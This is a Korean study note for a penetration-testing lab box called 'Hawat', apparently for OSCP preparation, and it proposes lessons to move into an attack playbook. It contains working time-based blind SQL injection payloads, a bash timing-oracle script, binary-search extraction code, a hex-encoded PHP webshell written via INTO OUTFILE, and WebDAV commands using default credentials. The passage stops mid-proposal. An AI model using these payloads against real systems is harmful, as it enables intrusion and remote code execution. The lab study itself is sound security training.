---
tags:
  - type/audit
  - platform/pg
manual_tags: true
---
# Hawat — `_PLAYBOOK` 이관 제안

출처 노트: `03. PG\Hawat.md` (개작 전 496행 / 백업 `03. PG\_backup\Hawat.md.bak`)
산출물: `~/PG/Hawat/` (2026-08-20 09:16~09:25) · 볼트 스크린샷 4장
⚠️ **번호는 비워 둠. 신규 항목의 번호는 단독 기록자가 충돌을 보고 배정할 것.** 박스 노트에는 기존 항목 앵커만 걸었음.

---

## 제안 1 — `A-1. 정찰·열거` / **신규**

### 넣을 본문

````markdown
#### A-1-□. 웹이 상위 1000 포트 «밖»에만 있다

**증상** — top-1000 스캔에 SSH 하나만 뜸. 「웹이 없는 박스」로 판단하면 시작조차 못 함.

[[Hawat]] — 열린 포트가 `22 · 17445 · 30455 · 50080` 이고 **80 이 아예 없음.** 웹 3개가 전부 고번호 포트임. `-p-` 를 생략했으면 이 박스는 진입점이 0개였음.
```text
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.4 (protocol 2.0)
17445/tcp open   http         Apache Tomcat (language: en)
30455/tcp open   http         nginx 1.18.0
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
```
— 출처: `~/PG/Hawat/nmap.log`

**비용은 1분 미만임** — `-p- --min-rate 3000` 전수 스캔이 **44초**에 끝났음(`allports.nmap`, 09:15:39~09:16:23). 급하면 2단계로 나눌 것: `-p-` 로 포트만 먼저 뽑고 열린 포트에만 `-sCV` 를 다시 검.
⚠️ [[Hawat]] 은 두 스캔을 **겹쳐** 돌렸음 — `nmap.log`(`-sCV -p- -A`, 09:15:12~09:16:03)와 `allports.nmap`(`-p-` 만, 09:15:39~09:16:23)이 51초·44초로 거의 동시에 돌아 사실상 중복임(A-18 과 같은 부류).
````

### 지우기 전 원문 (Hawat 노트 §1 · §7-1)

> > [!danger] **80번 포트가 없다.** `-p-` 전수 스캔을 안 했으면 이 박스는 시작조차 못 한다
> > 웹이 전부 **고번호 포트**(17445 · 30455 · 50080)에 있다.
> > 시험에서 "웹이 없는 것 같다"고 판단하기 전에 **반드시 전 포트 스캔**을 돌려라. `--min-rate 5000`이면 1분 안에 끝난다.
> > 시간이 급하면 `nmap -p- --min-rate 10000 -T4` 로 포트만 먼저 뽑고, 열린 포트에만 `-sCV`를 다시 거는 2단계가 빠르다.
>
> 1. **`-p-` 전수 스캔은 타협하지 마라.** 이 박스는 80이 없고 웹이 전부 고번호 포트다. 기본 1000포트 스캔이면 SSH만 보고 끝난다. 급하면 2단계(`-p-`로 포트만 → 열린 포트에 `-sCV`)로 나눠라.

---

## 제안 2 — `A-2. 진입 (foothold)` / **신규**

### 넣을 본문

````markdown
#### A-2-□. 노출된 소스와 «배포본»이 다르다 — 소스는 지도지 정답지가 아니다

**증상** — 소스대로 호출했는데 405 Method Not Allowed. 「막혔다」가 아니라 **리비전이 어긋난 것**임.

[[Hawat]] — Nextcloud 에서 회수한 `issuetracker.zip` 의 컨트롤러는 `@GetMapping("/issue/checkByPriority")`(소스 60행)였음. 그래서 GET 으로 판단했는데 **배포된 jar 는 POST 만 받음.**
```text
GET  /issue/checkByPriority?priority=Normal            → 405 Method Not Allowed
GET  ...priority=Normal' UNION SELECT sleep(5)--       → 405, 0.17s
POST priority=Normal' UNION SELECT sleep(5)--          → 200, 5.17s
```
⚠️ 이 응답 3행은 원 노트 기록이고 raw 응답은 산출물 미보존임. 다만 **산출물 5종(`oracle.sh`·`exploit.py`·`probe.py`·`blind.py`·`shell.py`)이 전부 POST 로 고정**돼 있어 「소스는 GET, 성립은 POST」는 교차 확인됨.

**왜 어긋나는가** — 노출된 소스는 **개발 중 스냅샷**일 수 있음. 진짜 배포본은 [[Hawat]] 의 경우 `/home/clinton/tracker-0.0.1-SNAPSHOT.jar` 였고, 셸을 잡은 뒤 디컴파일하면 실제 코드가 나옴.

→ **소스에서 얻은 「어떻게 호출하는가」는 «가설»로 취급하고 405·400 같은 응답으로 즉시 검증할 것.** 405 가 나오면 메서드부터 바꿔 볼 것 — 그것이 이 함정의 탈출구임. 반면 **「어디에 취약점이 있는가」는 소스가 정확했음**(70행 문자열 연결이 그대로 성립).
````

### 지우기 전 원문 (Hawat 노트 §6-①)

> ### ① 소스가 배포본보다 구버전이었다 — 가장 값진 교훈
>
> zip 안의 컨트롤러는 **`@GetMapping`**이었다. 그래서 "GET 요청이 맞다"고 판단했는데, **실제 배포된 jar는 POST만 받는다**:
>
> ```text
> GET  /issue/checkByPriority?priority=Normal            → 405 Method Not Allowed
> GET  ...priority=Normal' UNION SELECT sleep(5)--       → 405, 0.17s
> POST priority=Normal' UNION SELECT sleep(5)--          → 200, 5.17s
> ```
>
> > [!danger] **소스 리뷰 결과와 실측이 다르면 실측이 옳다**
> > 노출된 소스는 **개발 중 스냅샷**일 수 있다. 배포된 바이너리와 리비전이 다르면 시그니처가 어긋난다.
> > 소스는 **"어디에 취약점이 있는가"를 알려주는 지도**이지 **"어떻게 호출하는가"의 정답지가 아니다.**
> > 확인법: `/home/clinton/tracker-0.0.1-SNAPSHOT.jar`가 실제 배포본이다. 셸을 잡은 뒤 이걸 디컴파일하면 진짜 코드가 나온다.
> >
> > **실무 규칙: 소스에서 얻은 정보는 "가설"로 취급하고, 405/400 같은 응답으로 즉시 검증하라.** 405가 나오면 메서드를 바꿔본다 — 그게 이 함정의 탈출구다.
>
> 4. **소스와 배포본이 다를 수 있다.** 소스는 지도이지 정답지가 아니다. **405/400 응답이 나오면 메서드·파라미터를 바꿔 실측하라.**

---

## 제안 3 — `A-2. 진입 (foothold)` / **신규**

### 넣을 본문

````markdown
#### A-2-□. 웹셸을 심을 웹루트를 «틀린 곳»에 골랐다

**증상** — `INTO OUTFILE` 이 오류 없이 돌아왔는데 그 URL 이 404. 또는 웹셸은 도는데 uid 가 낮음.

[[Hawat]] — 웹서버가 둘(50080 Apache · 30455 nginx+php-fpm)이라 **쓰는 위치에 따라 웹셸 실행 uid 가 달라짐.**

| 포트 | 서버 | DocumentRoot | 디렉터리 권한 | 웹셸 uid |
|---|---|---|---|---|
| 50080 | Apache + PHP | `/srv/apache` | 0777 | `uid=33(http)` |
| 30455 | nginx + PHP-FPM | `/srv/http` | 0777 | **`uid=0(root)`** |
| — | (nginx 기본) | `/usr/share/nginx/html` | 0755 root | 쓰기 실패 |

**시행착오 순서가 파일 mtime 에 그대로 찍힘:**
- `exploit.py`(09:20:35) — 투하 경로가 **`/usr/share/nginx/html/rce.php` 하나로 하드코딩**. 이것이 0755 root 라 실패한 경로임
- `probe.py`(09:21:21) — 그래서 웹루트 후보를 `load_file()` 오라클로 전수 탐색(`/usr/share/webapps/nextcloud/config/config.php`·`/usr/share/nginx/html/cloud/config/config.php`·`/usr/share/httpd/index.html`·`/srv/www/index.html`·`/home/issue/local.txt`·`/etc/passwd`)
- `shell.py`(09:23:20) — 경로를 **`sys.argv` 로 받도록 고쳐** 여러 후보에 연속 투하 + 즉시 `load_file()` 로 성공 확인
→ 하드코딩 1경로 → 탐색 → 파라미터화. **약 3분이 이 구간에 들어감.**

⛔ **「존재 확인」을 없는 파일명으로 하지 말 것.** [[Hawat]] 은 웹루트 확인용으로 `/index.html` 을 요청해 404 를 받았는데, 그 디렉터리에는 `index.php` 만 있었음(`~/PG/Hawat/gob_30455.txt` 가 `index.php` 200 / `index.html` 부재를 그대로 보여줌). **`phpinfo.php` 의 `DOCUMENT_ROOT` 처럼 직접적인 근거를 쓰거나 실제로 있는 파일명으로 확인할 것.**

**투하 전 확인 한 줄** — `ps aux | grep -E 'nginx|apache|php-fpm'`. 누가 그 PHP 를 실행하는지가 권한상승 유무를 통째로 결정함(B-34).
````

### 지우기 전 원문 (Hawat 노트 §3-3 서두 · §6-③ · §7-8)

> ### 3-3. 어느 웹루트에 쓸 것인가 — 이 박스의 진짜 함정
>
> 웹서버가 둘이라 **쓰는 위치에 따라 웹셸의 실행 권한이 달라진다.**
>
> ### ③ `/srv/http/index.html`이 없어서 존재 확인에 실패
>
> 웹루트 확인용으로 `index.html`을 요청했는데 404였다. 그 디렉터리에는 `index.php`만 있었다.
> **존재 확인은 실제로 있는 파일명으로 하거나, `phpinfo.php`의 `DOCUMENT_ROOT`처럼 직접적인 근거를 써라.**
>
> 8. **웹셸을 심기 전에 "누가 그 PHP를 실행하는가"를 확인하라.** `ps aux | grep -E 'nginx|apache|php-fpm'`. 같은 호스트에 웹서버가 둘이면 실행 uid가 다를 수 있고, **root로 도는 쪽에 심으면 권한상승이 통째로 생략**된다.

---

## 제안 4 — `A-6. 판단·검증 (메타)` / **기존 `A-61. 관측은 맞는데 결론이 어긋난다` 에 병합(append)**

### 넣을 본문 (A-61 말미에 붙임)

````markdown
**「쓰기가 됐다」에서 「DB 가 root 다」를 추론하지 말 것.** [[Hawat]] — `INTO OUTFILE` 로 `/srv/http` 에 웹셸이 써졌고 그 웹셸이 `uid=0` 이라 「mysqld 가 root」로 넘어갈 뻔했음. 확인해 보니 아님:
```text
mysql    mariadbd
```
`load_file('/root/proof.txt')`·`load_file('/etc/shadow')` 가 전부 `NULL` 인 것이 같은 증거임(`~/PG/Hawat/probe.py` 의 `== mysqld privilege level ==` 블록이 정확히 이것을 물음).
쓰기가 된 진짜 이유는 **대상 디렉터리가 0777** 이어서였고, 0755 root 인 `/usr/share/nginx/html` 에는 조용히 실패했음. root 웹셸이 된 이유는 **`/etc/nginx/nginx.conf` 의 `user root;`** 로 nginx·php-fpm7 이 둘 다 root 구동이기 때문임 — MySQL 과 무관함.
→ **관측(파일이 써졌다 · 웹셸이 root 다)은 둘 다 옳았고 그 사이를 잇는 인과가 틀렸던 사례.** 「무엇이 그 파일을 썼는가」와 「무엇이 그 파일을 실행하는가」는 서로 다른 프로세스임.

⚠️ **`@@secure_file_priv IS NULL` 이 TRUE 인데도 파일 쓰기가 성립했음**([[Hawat]]). 교과서대로면 `NULL` 은 파일 입출력 전면 차단임. **변수값보다 실측을 믿을 것** — `/tmp` 에 마커 파일 하나를 쓰는 것이 가장 빠른 판정임. `[가정]` 이 오라클의 응답은 산출물에 남아 있지 않음(`probe.py` 는 `secure_file_priv` 를 묻지 않음) — 원 노트 기록임.
````

### 지우기 전 원문 (Hawat 노트 §6-② · §3-2 콜아웃 · §3-3 콜아웃)

> ### ② "MySQL이 root"라는 잘못된 전제
>
> `INTO OUTFILE`이 되니 "mysqld가 root겠지" 하고 넘어갈 뻔했다. 확인해보니 아니다:
>
> ```bash
> [root@hawat http]# ps -o user=,comm= -C mysqld -C mariadbd
> mysql    mariadbd
> ```
>
> `load_file('/root/proof.txt')` → `NULL`, `/etc/shadow` → `NULL`. **mysqld는 root가 아니다.**
> 쓰기가 된 이유는 단지 **`/srv/http`와 `/srv/apache`가 0777**이었기 때문이고, `/usr/share/nginx/html`(0755 root)에는 조용히 실패했다.
>
> **"쓰기가 됐다"에서 "DB가 root다"를 추론하면 안 된다.** 디렉터리 권한을 봐라.
>
> > [!danger] `@@secure_file_priv IS NULL`이 TRUE인데도 쓰기가 됐다
> > 교과서대로면 `NULL`은 **파일 입출력 전면 차단**이다. 그런데 실제로는 `load_file()`도 `INTO OUTFILE`도 동작했다.
> > **변수값보다 실측을 믿어라.** `/tmp`에 마커 파일을 하나 써보는 것이 가장 빠른 판정이다.
>
> > [!danger] root RCE의 원인은 MySQL이 아니다
> > 흔한 오해: "MySQL이 root로 도니까 root 웹셸이 된다."
> > **틀렸다.** `ps`로 확인하면 mysqld는 `mysql` 사용자로 돈다. `/root/proof.txt`·`/etc/shadow`를 `load_file()`로 못 읽는 것이 그 증거다.

(⚠️ 「root RCE 의 원인은 MySQL 이 아니다」 콜아웃 자체는 **박스 노트 본문에 그대로 남겼음** — 그 박스의 재현·납득에 필요한 인과이기 때문. 위 병합분은 그것의 «일반화» 부분만 가져간 것임.)

---

## 제안 5 — `B-1. 웹` / **기존 `B-12. SQLi 수동 UNION — sqlmap 금지 대비` 에 병합(append)**

### 넣을 본문 (B-12 말미, 「출처」 줄 앞에 붙임)

````markdown
**출력 채널이 «셋 다» 막힌 SQLi — 남는 것은 time-based 와 부작용뿐임.** [[Hawat]] 은 소스를 손에 넣어 이 판정을 **주입을 던지기 전에** 내렸고, 그 덕에 UNION 추출로 헤매지 않았음.

| 소스의 이 줄 | 죽는 채널 |
|---|---|
| `stmt.executeQuery(query);` — 반환값을 변수에 안 담음 | 결과가 화면에 안 나옴 → **UNION 추출 불가** |
| `catch { e1.printStackTrace(); }` — 예외를 삼킴 | 에러가 응답에 안 나옴 → **에러 기반 불가** |
| `service.GetAll()` — 주입과 무관하게 항상 전체 목록 렌더 | 응답 길이로도 구분 불가 → **Boolean 기반도 어려움** |

→ **남는 채널 둘** — ① time-based blind(`SLEEP()`) ② 부작용(`INTO OUTFILE` 파일 쓰기).
⛔ **스택 쿼리(`; DROP …`)는 JDBC 에서 기본 불가** — MySQL Connector/J 의 `allowMultiQueries` 기본값이 `false` 이고 [[Hawat]] 의 JDBC URL(`application.properties`)에 그 파라미터가 없음. **JDBC URL 을 손에 넣으면 이 한 가지를 먼저 볼 것.**

**time-based 오라클을 셸 함수로 «고정»하고 재사용할 것** — 조건만 인자로 받게 만들면 그 뒤 모든 판정이 한 줄이 됨:
```bash
#!/bin/bash
# $1 = SQL boolean condition. Prints elapsed time; >4s == TRUE
T=$(curl -s -o /dev/null -w '%{time_total}' -m 60 -b ~/PG/Hawat/cj.txt   -X POST 'http://192.168.248.147:17445/issue/checkByPriority'   --data-urlencode "priority=Normal' UNION SELECT IF(($1),sleep(5),0)-- ")
echo "[$T] $1"
```
— 출처: `~/PG/Hawat/oracle.sh`

**한 글자 추출은 «이진 탐색 + 병렬»로.** 선형 비교(256회)가 아니라 `ASCII(SUBSTRING(expr,i,1))>mid` 이진 탐색 8회로 한 문자를 확정하고, 문자 «위치»별로 스레드를 나눔. 지연도 5초가 아니라 **1.5초로 낮추고 임계를 1.0초**로 잡음:
```python
def getchar(expr,i):
    lo,hi=0,255
    while lo<hi:
        mid=(lo+hi)//2
        if ask('ASCII(SUBSTRING(%s,%d,1))>%d'%(expr,i,mid)): lo=mid+1
        else: hi=mid
    return lo
```
— 출처: `~/PG/Hawat/blind.py`(16 워커 `ThreadPoolExecutor`)
⚠️ 임계를 낮추면 네트워크 지터에 오탐이 남 — `ask()` 가 예외 시 3회 재시도하는 이유임. 지연값·임계는 baseline(이 박스는 0.18초) 대비로 정할 것.

**`-- ` 뒤의 «공백»이 필수임** — MySQL 은 `--` 다음에 공백·개행이 있어야 주석으로 인식함. `--data-urlencode` 를 쓰는 이유가 이것(그리고 `'`·`(`·`)`)을 손으로 인코딩하다 깨뜨리지 않기 위함임.

**`INTO OUTFILE` 전에 셋을 확인할 것** — ①DB 사용자의 `FILE` 권한 ②`@@secure_file_priv` ③**대상 디렉터리가 mysqld 소유자에게 쓰기 가능한가.** 셋 중 실질 관문은 ③임. 단 **변수값보다 실측이 우선**(A-61) — `/tmp` 마커 파일을 실제로 써 볼 것.
````

### 지우기 전 원문 (Hawat 노트 §2-3 · §3-1 페이로드 해설 · §3-2 · §7-5·6·7)

> ### 2-3. 출력 채널이 없다 — 이게 이 박스의 핵심 난점
>
> 세 줄이 결정적이다:
>
> | 코드 | 결과 |
> |---|---|
> | `stmt.executeQuery(query);` — 반환값을 **변수에 담지 않는다** | 쿼리 결과가 화면에 **안 나온다** → **UNION 추출 불가** |
> | `catch { e1.printStackTrace(); }` — 예외를 **삼킨다** | 에러 메시지가 응답에 **안 나온다** → **에러 기반 불가** |
> | `service.GetAll()` — 주입과 무관하게 **항상 전체 목록** 렌더 | 응답 길이 차이로도 구분 불가 → **Boolean 기반도 어렵다** |
>
> > [!danger] 남는 채널은 둘뿐이다
> > 1. **Time-based blind** — `SLEEP()`으로 참/거짓을 **응답 시간**으로 읽는다
> > 2. **부작용(side-effect)** — `INTO OUTFILE`로 **파일을 쓴다**
> >
> > **스택 쿼리(`; DROP ...`)는 안 된다.** MySQL Connector/J는 `allowMultiQueries=false`가 기본이라 세미콜론 뒤가 실행되지 않는다.
> > 이 판단을 **소스만 보고 미리** 할 수 있었기에 UNION으로 헤매는 시간을 아꼈다.
>
> ### 3-2. 파일 쓰기 가능 여부 확인
>
> `INTO OUTFILE`이 되려면 세 조건이 필요하다 — **던지기 전에 확인**한다:
>
> | 조건 | 확인 방법 |
> |---|---|
> | DB 사용자에게 `FILE` 권한 | `INTO OUTFILE '/tmp/marker.txt'` 를 실제로 시도 |
> | `@@secure_file_priv`가 빈 문자열 | blind로 읽기 |
> | 대상 디렉터리가 **mysqld 프로세스 소유자**에게 쓰기 가능 | 여기가 진짜 관문 |
>
> 5. **⚠️ sqlmap 금지 → 수동 blind SQLi 절차를 익혀라.**
>    - 확인: `' UNION SELECT sleep(5)-- ` 후 응답 시간 비교
>    - 컬럼 수 맞추기: `ORDER BY n` 또는 `UNION SELECT 1,2,3...`
>    - 추출: `IF(condition, sleep(5), 0)` 로 한 글자씩 이진 탐색
>    - 파일 쓰기: `INTO OUTFILE` / `INTO DUMPFILE`
> 6. **출력 채널이 없는 SQLi를 소스로 미리 판별하라.** `executeQuery` 결과를 버리고 예외를 삼키면 → UNION·에러 기반 둘 다 죽는다. **time-based와 부작용만 남는다**는 판단을 미리 내리면 시간을 크게 아낀다.
> 7. **`INTO OUTFILE` 전에 3가지를 확인한다** — `FILE` 권한 · `@@secure_file_priv` · **대상 디렉터리의 쓰기 권한**. 셋 중 디렉터리 권한이 실질적 관문이다. 단 **변수값보다 실측(마커 파일 쓰기)이 우선**이다.

(⚠️ §3-1 의 페이로드 조각 해설 표와 `--data-urlencode` 설명은 **박스 노트 본문에 그대로 남겼음** — 그 박스의 재현에 필요하기 때문. 위 병합분은 일반화 부분만 가져간 것임.)

---

## 제안 6 — `B-1. 웹` / **신규**

### 넣을 본문

````markdown
#### B-1-□. 노출된 소스를 «먼저» 확보한다 — 화이트박스가 블랙박스보다 압도적으로 빠르다

**정황** — `.git` 유출 · 백업 zip · 공유 스토리지의 아카이브 · 공개 저장소. 보이면 **다른 것보다 먼저** 확보할 것.

[[Hawat]] — 50080 Nextcloud 가 `admin:admin` 으로 열렸고 그 안에 `issuetracker.zip`(애플리케이션 전체 소스)이 있었음. 소스 확보·리뷰에 시간이 들었지만 그 덕에 **주입을 던지기 전에** ①취약 지점 1곳 확정 ②출력 채널 3개가 전부 죽었다는 판정 ③자가 가입 경로 ④DB 자격증명을 전부 얻었음. 블랙박스로 blind SQLi 를 찾는 것보다 훨씬 빠름.

**소스를 손에 넣으면 순서대로 볼 것:**
1. **원시 SQL 조립 지점** — `grep -rn -iE 'createQuery|createNativeQuery|Statement|executeQuery|jdbcTemplate|@Query' --include='*.java' .`
   [[Hawat]] 은 이 grep 이 **`IssueController.java` 한 곳만** 뱉었음. 나머지는 전부 Spring Data JPA(파라미터 바인딩)라 안전
2. **Spring Security 설정** — `permitAll` 목록과 `csrf()` 상태. [[Hawat]] 은 `/register`·`POST /user/register` 가 `permitAll` + `csrf().disable()` 이라 **자가 가입이 열려 있었고 curl 한 줄로 세션을 얻음**
   ```java
        .csrf().disable()
       .authorizeRequests()
           .antMatchers("/", "/index", "/register", "/user/register", "/css/**", "/js/**").permitAll()
           .anyRequest().authenticated()
   ```
3. **DB 자격증명·JDBC URL** — `application.properties`·`application.yml`. [[Hawat]] 은 `issue_user` / `ManagementInsideOld797` 이 컨트롤러와 properties 양쪽에 평문. URL 의 `allowMultiQueries` 유무도 여기서 봄
4. **엔티티의 원시형 필드** — 폼 필드 하나가 빠지면 400 이 나는 원인이 여기 있음. [[Hawat]] `Users.userId` 가 `int` 원시형이고 `user_form.html` 이 그것을 hidden 으로 실어 보냄. **「가입 폼이 400 을 뱉는다 = 막혔다」가 아니라 「필드가 모자란 것」**일 수 있음

⚠️ **소스의 「어떻게 호출하는가」는 배포본과 다를 수 있음**(A-2-□ 소스≠배포본).
````

### 지우기 전 원문 (Hawat 노트 §0 · §2-1 · §2-4 · §6-④ · §7-3·11)

> ## 0. 이 박스에서 배우는 것
>
> - **소스 코드를 손에 넣고 읽어서 취약점을 찾는 흐름** — 블랙박스 퍼징이 아니라 화이트박스 리뷰
> - **출력 채널이 없는 SQLi**를 다루는 법 — UNION도 에러 기반도 막혔을 때 남는 것
> - **`INTO OUTFILE`로 웹셸 쓰기** — 파일 쓰기가 곧 RCE가 되는 조건
> - **"어느 웹루트에 써야 root가 되는가"** — 같은 호스트에 웹서버가 여럿이면 실행 주체가 다르다
> - **소스와 배포본이 다를 수 있다** — 이 박스에서 실제로 당했다
>
> > [!tip] 시험 출제 가능성
> > **높다.** OSCP 시험에는 "소스가 어딘가 노출돼 있고 그걸 읽어야 푸는" 박스가 흔하다(`.git` 유출, 백업 zip, 공개 저장소).
> > SQLi → `INTO OUTFILE` → 웹셸도 시험 단골이다. **sqlmap이 금지**이므로 이 노트의 수동 절차가 그대로 시험 자산이다.
>
> 프로젝트 전체에서 SQL을 문자열로 조립하는 곳은 **여기 한 곳뿐**이다. 나머지는 전부 Spring Data JPA(파라미터 바인딩)라 안전하다
>
> > [!warning] `userId=0`을 빼면 **HTTP 400**이 난다
> > `Users` 엔티티의 `userId`가 `int`(원시형)라 Spring이 빈 값을 바인딩하지 못한다.
> > "가입 폼이 400을 뱉는다 = 막혔다"가 아니라 **필드가 모자란 것**이다. 소스의 엔티티 정의를 보면 즉시 알 수 있다.
>
> > [!tip] `csrf().disable()`은 자동화의 문을 열어준다
> > CSRF 토큰이 있으면 매 요청마다 파싱해서 넣어야 한다. 비활성이면 `curl` 한 줄로 끝난다.
> > Spring Security 설정을 손에 넣었으면 **`permitAll` 목록과 `csrf()` 상태를 가장 먼저** 본다.
>
> ### ④ 시간 배분
>
> 소스 확보와 리뷰에 상당한 시간이 들었지만 **그 덕에 UNION으로 헤매지 않았다.**
> 시험 상황이라면 — **소스가 손에 들어오는 정황(zip·`.git`·백업)이 보이면 먼저 확보하는 것이 이득**이다. 블랙박스로 blind SQLi를 찾는 것보다 훨씬 빠르다.
>
> 3. **소스가 노출된 정황이 보이면 먼저 확보한다.** Nextcloud·`.git`·백업 zip. 화이트박스가 블랙박스보다 압도적으로 빠르다.
> 11. **Spring Security를 손에 넣으면 `permitAll` 목록과 `csrf()` 상태부터 본다.** 자가 가입이 열려 있으면 인증은 장애물이 아니다.

⚠️ **`userId=0` 항목은 `[가정]` 으로 강등해 옮겼음.** 소스로 확인되는 것은 **빈 값 전송 시** 원시형 바인딩이 실패한다는 것까지이고, 파라미터를 «아예 생략한» 요청의 응답은 산출물에 없음. 원 노트의 「빼면 400」은 근거가 부족함.

---

## 제안 7 — `B-2. 네트워크 서비스` 또는 `B-1. 웹` / **신규**

### 넣을 본문

````markdown
#### B-□. Nextcloud · ownCloud 를 만나면 WebDAV 를 직접 때린다

**경로 관례** — `/remote.php/dav/files/<사용자명>/` 이 그 사용자의 파일 루트임. `PROPFIND` 로 목록, `GET` 으로 다운로드, `PUT` 으로 업로드.

**웹 UI 를 거치지 않으므로 세션·CSRF 처리가 불필요**함 — 그대로 자동화됨.
```bash
curl -u admin:admin -X PROPFIND \
  'http://192.168.248.147:50080/cloud/remote.php/dav/files/admin/'
curl -u admin:admin -o issuetracker.zip \
  'http://192.168.248.147:50080/cloud/remote.php/dav/files/admin/issuetracker.zip'
```
[[Hawat]] — `admin:admin` 기본 자격증명으로 열렸고, 그 안의 `issuetracker.zip`(164010B, md5 `cd816a09d8608c3b24b4e8c5c212640c`)이 애플리케이션 전체 소스였음. **공유 스토리지에 놓인 아카이브가 곧 진입점임.**

⚠️ **워드리스트 디렉터리 열거로는 `/cloud` 가 안 잡혔음**(`~/PG/Hawat/gob_50080.txt` — `/4`·`/images`·`/index.html` 과 `.ht*` 403 뿐). 버전 확인은 `status.php` 로: `{"version":"20.0.7.1","productname":"Nextcloud"}`.
````

### 지우기 전 원문 (Hawat 노트 §2-1 콜아웃)

> > [!note] Nextcloud WebDAV 경로 관례
> > `/remote.php/dav/files/<사용자명>/` 이 그 사용자의 파일 루트다. `PROPFIND`로 목록, `GET`으로 다운로드, `PUT`으로 업로드가 된다.
> > **웹 UI를 거치지 않으므로 세션·CSRF 처리가 불필요**하다. Nextcloud/ownCloud를 만나면 이 경로를 먼저 쓴다.

(⚠️ 재현에 필요한 curl 두 줄과 md5 는 **박스 노트 본문에 남겼음.**)

---

## 제안 8 — `B-3. 리눅스 권한상승` / **기존 `B-34. root 로 도는 서비스의 «쓰기 가능한» 경로 = 권한상승` 에 병합(append)**

### 넣을 본문 (B-34 의 「출처」 줄 앞에 붙임)

````markdown
**웹서버 자체가 root 로 돌면 웹셸이 곧 root 셸임 — 권한상승 단계가 통째로 사라짐.** [[Hawat]] — `/etc/nginx/nginx.conf` 의 **`user root;`** 로 nginx 와 php-fpm7 이 둘 다 root 구동. 30455 웹루트(`/srv/http`, 0777)에 심은 PHP 가 첫 명령부터 `uid=0(root) gid=0(root) groups=0(root)`.
같은 호스트의 50080 Apache 웹루트(`/srv/apache`, 역시 0777)에 심었다면 `uid=33(http)` 에 그쳤음 — **어느 쪽에 심는가가 권한상승 유무를 결정함.**

**투하 전 한 줄** — `ps aux | grep -E 'nginx|apache|php-fpm'`. [[Hub]](FuguHub `User=root`)도 같은 부류임.

⚠️ **파일을 «쓴» 주체와 그 파일을 «실행하는» 주체는 다름.** [[Hawat]] 에서 쓴 것은 mysqld(`mysql` 사용자, `INTO OUTFILE`)이고 실행한 것은 php-fpm(root)임. 「쓰기가 됐다 = DB 가 root 다」로 넘어가면 오진임(A-61).
````

### 지우기 전 원문 (Hawat 노트 §3-3 콜아웃 후반 · §4 · §8)

> > 진짜 원인은 **`/etc/nginx/nginx.conf`의 `user root;`** 다. nginx와 php-fpm7이 **둘 다 root로 구동**되므로, 30455에 올린 PHP는 무엇이든 uid 0으로 실행된다:
> > ```
> > root     nginx
> > root     php-fpm7
> > ```
> > **웹셸을 심을 때는 "누가 그 PHP를 실행하는가"를 먼저 확인하라.** `ps aux | grep -E 'nginx|apache|php-fpm'` 한 줄이면 된다.
>
> ## 4. 권한상승
>
> **없다.** nginx·php-fpm이 root로 구동되므로 웹셸이 곧 root 셸이다.
>
> 이건 예외적인 경우가 아니라 **[[Hub]](FuguHub `User=root`)와 같은 패턴**이다. 셸을 잡자마자 `id`를 치는 습관이 여기서 시간을 아껴준다.
>
> | **nginx·php-fpm이 root로 구동** | `user http;`로 비특권 계정 지정. **이 하나만 고쳤어도 root RCE가 아니라 웹 사용자 RCE에 그쳤다** |

(⚠️ `root nginx` / `root php-fpm7` 2행 ps 출력은 산출물에 없고 원 노트 기록임 — **박스 노트에서는 서술로만 남기고 코드블록은 옮기지 않았음.** 병합 시에도 그 2행을 실측 블록처럼 싣지 말 것.)

---

## 제안 9 — `B-8. 페이로드·전송` / **기존 `B-81. 페이로드는 base64로 감싼다` 에 병합(append)**

### 넣을 본문 (B-81 아래에 붙임)

````markdown
**SQL 로 파일을 쓸 때는 hex 리터럴이 더 낫다.** [[Hawat]] — 웹셸 원문 `<?php system($_GET["cmd"]); ?>` 에 따옴표·`$`·`<`·`>` 가 섞여 curl → HTTP → JDBC → SQL 파서로 내려가며 **인용이 네 겹으로 중첩**됨. MySQL 은 `0x...` hex 문자열 리터럴을 그대로 받으므로 인용 문제가 통째로 사라짐.
```bash
echo -n '<?php system($_GET["cmd"]); ?>' | xxd -p | tr -d '\n'
```
```sql
Normal' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO OUTFILE '/srv/http/rce.php'-- 
```
**`UNION` 이라 파일 앞에 원 쿼리의 행들이 먼저 붙지만 무해함** — PHP 는 `<?php` 태그 밖을 텍스트로 출력할 뿐임. 깔끔하게 하려면 `INTO DUMPFILE`(단일 행, 가공 없음).

**누적 패턴 — 「인용이 깨지면 인코딩으로 도망간다」**: [[Hawat]] hex · [[Squid]] `INTO DUMPFILE` + hex + `-enc` + 배치 래핑 · [[Exfiltrated]] base64.
````

### 지우기 전 원문 (Hawat 노트 §3-4 콜아웃 · §7-9)

> > [!tip] 페이로드를 **hex 리터럴**로 넘기는 이유
> > 웹셸 원문은 `<?php system($_GET["cmd"]); ?>` 인데, 여기엔 따옴표·`$`·`<`·`>`가 섞여 있다.
> > curl → HTTP → JDBC → SQL 파서로 내려가며 **인용이 4중으로 중첩**되어 반드시 깨진다.
> > MySQL은 `0x...` 형태의 **hex 문자열 리터럴**을 그대로 받아주므로 인용 문제가 통째로 사라진다.
> > ```bash
> > echo -n '<?php system($_GET["cmd"]); ?>' | xxd -p | tr -d '\n'
> > ```
> > [[Squid]]의 `INTO DUMPFILE`, [[Exfiltrated]]의 base64 래핑과 같은 계열의 회피 기법이다.
>
> 9. **인용이 중첩되면 hex 리터럴이나 base64로 회피한다.** `0x3c3f706870...` / `echo <b64>|base64 -d`. ([[Squid]] · [[Exfiltrated]]와 동일 패턴)

(⚠️ 이 콜아웃은 **박스 노트 본문에도 남겼음** — 이 박스의 대표 교훈이라 재현 절에서 빠지면 납득이 끊김. `_PLAYBOOK` 쪽은 일반화 + 누적 패턴 색인 역할.)

---

## 제안 10 — `A-3. 셸` / **기존 `A-31. 리버스셸이 안 붙는다` 에 병합(append)** — ⚠️ 원 노트의 단정을 «강등»해서 반영할 것

### 넣을 본문 (A-31 의 「⚠️ 「80만 허용된다」고 단정하지 말 것」 문단 뒤에 붙임)

````markdown
